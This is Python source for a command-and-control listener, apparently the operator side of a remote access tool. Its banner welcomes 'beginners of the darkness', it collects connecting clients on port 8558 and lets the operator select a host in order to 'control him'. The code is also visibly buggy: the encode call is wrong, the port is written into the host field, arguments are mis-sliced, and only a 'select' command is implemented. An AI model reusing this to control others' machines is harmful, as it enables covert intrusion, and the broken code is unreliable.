import socket
import sys
import threading
import os
import time

class Client():
    def __init__(self, host, socket):
        self.host = host
        self.socket = socket
    
    def send(self, message):
        self.socket.send(message.encode(1024))

class Server():
    def __init__(self):
        self.host = "0.0.0.0"
        self.port = 8558
        self.clients = []
        self.selected = None

    def start(self):
        os.system("cls")
        print("Welcome to the official FE33B script, this script is not a game if you don't know what you do just go back play Minecraft or anything else, else welcome beginer of the darknest.")
        print("-------------------------------\n")
        tmphost = input("Enter the host (0.0.0.0): ")
        if (tmphost != None): self.host = tmphost
        tmpPort = input("Enter the port (8558): ")
        os.system("cls")
        print("Welcome to the official FE33B script, this script is not a game if you don't know what you do just go back play Minecraft or anything else, else welcome beginer of the darknest.")
        print("-------------------------------")
        if (tmpPort != None): self.host = tmpPort 
        self.build_connection()
        print("[*] Waiting for the client...\n")
        t1 = threading.Thread(target=self.listen)
        t1.start()
        t2 = threading.Thread(target=self.commandExecutor)
        t2.start()
    
    def commandExecutor(self):
        while True:
            print("> ", end="")
            cmd = input()
            self.execute(cmd)
            print("\033[A\033[K\033[A\033[K", end='')
            print(f"[*] Command '{cmd}' sent successfully.\n")


    def build_connection(self):
        global client, addr, s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((self.host, self.port))

    def listen(self):
        while True:
            s.listen(5)  
            client, addr = s.accept()
            print(("\b" * 20) + "\033[A\033[K" + ("\b" * 5) + "[+] New client added !\n \n" + ("\b" * 5) + "> ", end="")
            self.clients.append(Client(addr, client))

    def sendMessage(self, message, target=None):
        if self.selected == None and target == None:
            self.print("Non target selected, please select an target and try again.")
            return False
        else:
            for client in self.clients:
                if client.host == target or client.host == self.selected:
                    client.send(message)
                    self.print("Message sent to target successfully.")
                    return True
            self.print("Target not found, please try again in a few seconds.")
            return False
    
    def print(self, message):
        print(("\b" * 20) + "\033[A\033[K\033[A\033[K" + ("\b" * 5) + message + "\n \n" + ("\b" * 5) + "> ")
    
    def execute(self, cmds):
        cmds = str(cmds)
        cmd = cmds.lower().split(" ")[0]
        args = cmds.lower().split(" ")[1:-1]
        if (cmd == "select"):
            if len(args) >= 1:
                self.selected = args[0]
                self.print(f"[*] Selected host {args[0]}, you can now control him.")
            else:
                self.print("[!] Please select an host ip for use this command. If you need help enter the command 'help' or '?'.")
        

Server().start()